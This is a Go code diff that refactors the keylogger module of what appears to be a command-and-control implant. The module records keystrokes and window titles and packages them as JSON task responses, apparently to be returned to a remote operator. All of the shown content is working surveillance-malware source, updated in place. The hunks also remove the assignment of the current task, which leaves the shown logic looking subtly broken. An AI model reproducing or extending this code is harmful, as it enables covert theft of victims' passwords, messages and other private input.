@@ -4,17 +4,18 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+
 	//"log"
 	"os/user"
 	"sync"
 	"time"
 
 	"pkg/utils/structs"
+	"pkg/profiles"
 )
 
 var (
 	curTask *structs.Task
-	msgChan chan<- structs.ThreadMsg
 	// Struct to monitor keystrokes.
 	ksmonitor, _ = NewKeyLog()
 	// Maps strings to their shift counter-parts on US keyboards.
@@ -104,20 +105,19 @@ func (k *KeyLog) SetWindowTitle(s string) {
 
 func (k *KeyLog) SendMessage() {
 	serMsg := ksmonitor.ToSerialStruct()
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = *curTask
+	msg := structs.Response{}
+	msg.TaskID = curTask.TaskID
 	data, err := json.MarshalIndent(serMsg, "", "    ")
 	//log.Println("Sending across the wire:", string(data))
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
+		msg.UserOutput = err.Error()
+		msg.Status = "error"
+		msg.Completed = true
+		resp, _ := json.Marshal(msg)
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
 	} else {
-		tMsg.SpecialResult = data
+		profiles.TaskResponses = append(profiles.TaskResponses, data)
 	}
-	go func() {
-		msgChan <- tMsg
-	}()
 }
 
 func NewKeyLog() (KeyLog, error) {
@@ -132,13 +132,12 @@ func NewKeyLog() (KeyLog, error) {
 	}, nil
 }
 
-func StartKeylogger(task structs.Task, threadChannel chan<- structs.ThreadMsg) error {
+func StartKeylogger(task structs.Task) error {
 	// This function is responsible for dumping output.
 	if curTask != nil && curTask.Job.Monitoring {
-		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.ID))
+		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
 	}
-	curTask = &task
-	msgChan = threadChannel
+
 	go func() {
 		for {
 			timer := time.NewTimer(time.Minute)
